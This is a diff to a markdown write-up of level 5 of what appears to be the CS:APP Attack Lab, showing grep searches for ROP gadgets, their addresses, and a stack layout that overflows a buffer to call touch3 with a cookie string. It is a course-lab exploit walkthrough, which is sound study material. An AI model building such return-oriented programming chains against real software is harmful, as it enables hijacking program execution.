@@ -91,3 +91,93 @@ addr: 0x4019cc
 addr: 0x4019c5
 addr: 0x4017ec
 ```
+
+## Lv 5
+
+Use ChatGPT to form the byte sequence from farm:
+
+![](assest/FrwhYyfWIAgAnNf.png)
+![](assest/Frwhdc3WYAA_IFO.png)
+
+Find a gadget to save %rsp:
+```shell
+grep -P '48 89 e[0-7] (90 )*c3' < dumpr.clean.d
+```
+get:
+- mov %rsp, %rax : `0x401a06`
+
+Find gadgets to add something:
+```shell
+grep -P '48 8d (.. ){0,4}c3' < dumpr.clean.d
+```
+get:
+- lea (%rdi, %rsi, 1), %rax : `0x4019d6`
+
+Find gadgets to move %rax:
+```shell
+grep -P '48 89 c[0-7] (.. ){0,4}c3' < dumpr.clean.d
+```
+get:
+- movq %rax, %rdi : `0x4019c5`
+
+Find gadgets to move something to %rsi:
+```shell
+grep -P '89 .[6e] (.. ){0,4}c3' < dumpr.clean.d
+```
+get:
+- movl %ecx, %esi : `0x401a13`
+
+Find gadgets to move something to %ecx:
+```shell
+grep -P '89 [c-f](1|9) (.. ){0,4}c3' < dumpr.clean.d
+```
+get:
+- movl %edx, %ecx : `0x401a34`
+
+Find gadgets to move something to %edx:
+```shell
+grep -P '89 [c-f](2|a) (.. ){0,4}c3' < dumpr.clean.d
+```
+get:
+- movl %eax, %edx : `0x4019dd`
+
+Finally, we can pop something to %eax:
+- popq %rax : `0x4019cc`
+
+The code be like:
+```asm
+mov %rsp, %rax : `0x401a06`
+movq %rax, %rdi : `0x4019c5`
+popq %rax : `0x4019cc`
+movl %eax, %edx : `0x4019dd`
+movl %edx, %ecx : `0x401a34`
+movl %ecx, %esi : `0x401a13`
+lea (%rdi, %rsi, 1), %rax : `0x4019d6`
+movq %rax, %rdi : `0x4019c5`
+call touch3
+```
+
+- the value of `cookie`: `0x59b997fa`
+- the corresponding byte sequence encoding the string `'59b997fa'`: `35 39 62 39 39 37 66 61`
+
+The stack should be like:
+```
+# [any byte] * 0x28
+addr: 0x401a06
+=== %rax is here ===
+addr: 0x4019c5
+addr: 0x4019cc
+0x9*8=0x48
+addr: 0x4019dd
+addr: 0x401a34
+addr: 0x401a13
+addr: 0x4019d6
+addr: 0x4019c5
+addr: 0x4018fa (touch3)
+35 39 62 39 39 37 66 61
+```
+
+Use ChatGPT to convert it:
+
+![](assest/p3.png)
+![](assest/p4.png)
